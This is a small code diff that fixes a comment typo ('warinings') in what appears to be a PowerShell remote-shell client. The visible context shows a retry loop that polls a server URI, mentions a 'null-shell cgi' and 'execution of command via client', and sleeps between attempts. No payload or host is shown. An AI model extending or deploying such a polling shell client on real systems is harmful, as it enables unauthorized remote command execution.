@@ -158,7 +158,7 @@ while (1)
 
 			catch
 			{
-				# uncomment the warinings below for debugging
+				# uncomment the warnings below for debugging
 				#Write-Warning "Something went wrong with execution of command via client."
 				#Write-Error $_
 				Start-Sleep -s 300
@@ -170,7 +170,7 @@ while (1)
 
 	catch
 	{
-		# uncomment the warinings below for debugging
+		# uncomment the warnings below for debugging
         	#Write-Warning "Attempting to contact $uri failed do you have the null-shell cgi set up?, will retry."
         	#Write-Error $_
     		Start-Sleep -s 300
